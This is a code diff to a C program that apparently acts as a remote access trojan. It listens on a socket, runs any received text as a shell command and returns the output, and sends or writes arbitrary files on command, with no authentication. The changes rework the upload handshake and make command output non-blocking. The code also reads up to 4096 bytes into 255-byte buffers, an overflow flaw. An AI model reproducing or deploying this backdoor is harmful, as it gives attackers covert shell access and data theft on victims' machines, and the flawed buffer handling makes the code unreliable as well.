@@ -7,6 +7,7 @@
 #include <netdb.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
+#include <fcntl.h>
 #define DEBUG 1
 #define RAT 0
 
@@ -31,6 +32,7 @@ int main(int argc, char *argv[]){
 	socklen_t addr_size = sizeof(their_addr);
 	char paddr[INET_ADDRSTRLEN], receive[100], tokcmdbuf[100], cmdbuf[255], cmdtok[100], sendbuf[255], currentuser[99];
 	char *ptr;
+	FILE *fp;
 	memset(&hints, 0, sizeof hints);
 	hints.ai_family = AF_INET;
 	hints.ai_socktype = SOCK_STREAM;
@@ -41,7 +43,7 @@ int main(int argc, char *argv[]){
 		return -1;
 	}
 	//Get current running user
-	FILE *fp = popen("whoami","r");
+	fp = popen("whoami","r");
 	if(fgets(currentuser, 99, fp) == NULL){
 		printf("Cannot Retrieve Current user\n");
 		return -1;
@@ -111,7 +113,7 @@ int main(int argc, char *argv[]){
 			//DOWNLOAD
 			if(strncmp(cmdtok, "download",9)==0){
 				if(DEBUG) printf("Running as Download\n");
-		 		FILE *fp = fopen(strtok(NULL," "),"r");
+		 		fp = fopen(strtok(NULL," "),"r");
 		 		if(fp!=NULL){
 					while (fgets(sendbuf, 4096, fp) != NULL){
 						if(send(new_fd, sendbuf, strlen(sendbuf), 0)<0){
@@ -137,31 +139,47 @@ int main(int argc, char *argv[]){
 				if(DEBUG) printf("Running as Upload\n");
 				strcpy(cmdtok,strtok(NULL," "));
 				if(DEBUG) printf("File being uploaded: %s\n", cmdtok);
-		 		FILE *fp = fopen(strtok(NULL," "),"w");
-		 		if(DEBUG) printf("Successfully able to open file for writing\n");
-		 		while(1){
-				if((bytes = recv(new_fd, receive, 99, 0)) == -1){
-                		close(new_fd);
-                        	perror("Recv Error");
-                        	return -1;
+		 		fp = fopen(strtok(NULL," "),"w");
+		 		if(fp != NULL){
+					if(DEBUG) printf("Successfully able to open file for writing\n");
+					if(send(new_fd, "000FOS000", 9, 0)<0){
+						perror("send");
+					}
+					while(1){
+						if((bytes = recv(new_fd, receive, 99, 0)) == -1){
+							close(new_fd);
+							perror("Recv Error");
+							return -1;
+						}
+						receive[bytes]='\0';
+						if(strncmp(receive, "000xxx000", 9)==0){
+						//printf("RECIEVED FINAL TERMINATOR\n");
+						break;
+						}
+					fputs(receive,fp);
+					}
+					if(DEBUG) printf("Complete\n");
+					fclose(fp);
 				}
-				receive[bytes]='\0';
-				if(strncmp(receive, "000xxx000", 9)==0){
-                	//printf("RECIEVED FINAL TERMINATOR\n");
-                    break;
+				else {
+					if(send(new_fd, "000xxx000", 9, 0)<0){
+						perror("send");
+					}
 				}
-				fputs(receive,fp);
 			}
-			if(DEBUG) printf("Complete\n");
-			fclose(fp);
-			}
-
+			
 			//SHELL COMMAND
 			else{
 				if(DEBUG) printf("Running as command\n");
 				
 				strcat(cmdbuf, " 2>&1");
-				FILE *fp = popen(cmdbuf,"r");
+				fp = popen(cmdbuf,"re");
+				int fd = fileno(fp);
+				int flags;
+				flags = fcntl(fd, F_GETFL, 0);
+				flags |= O_NONBLOCK;
+				fcntl(fd, F_SETFL, flags);
+				sleep(1);
 				while (fgets(sendbuf, 4096, fp) != NULL){
 					if(send(new_fd, sendbuf, strlen(sendbuf), 0)<0){
 						perror("send");
